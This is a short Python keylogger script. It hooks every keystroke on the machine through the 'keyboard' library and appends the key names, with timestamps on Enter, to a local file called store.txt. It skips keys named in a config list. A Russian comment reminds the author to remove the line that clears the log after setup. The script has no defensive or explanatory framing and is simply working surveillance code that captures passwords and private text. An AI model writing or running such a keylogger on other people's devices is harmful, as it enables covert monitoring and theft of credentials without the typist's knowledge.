import keyboard
import datetime
import config
from layout_settings import change_layout


def pressed_keys(press):
    if press.event_type == 'down':
        letter = str(press.name)
        time = datetime.datetime.now().strftime('%H:%M, %Y.%m.%d')
        store = open('store.txt', 'a')
        update(letter, ' ' + time, store)


def is_need_to_write(letter):
    if letter in config.thresh:
        return False
    return True


def update(letter, time, store):
    if not is_need_to_write(letter):
        return
    if letter == 'space':
        store.write(' ')
    elif letter == 'enter':
        store.write(time + ' ' + '\n')
    elif letter == 'backspace':
        store.write(' ' + letter + ' ')
    else:
        store.write(letter)# change_layout(letter))
    store.close()


with open('store.txt', 'w', encoding='utf-8') as file: file.write('')
# после того как закончим настройки, обазательно удалить эту строку

keyboard.hook(pressed_keys)
keyboard.wait()
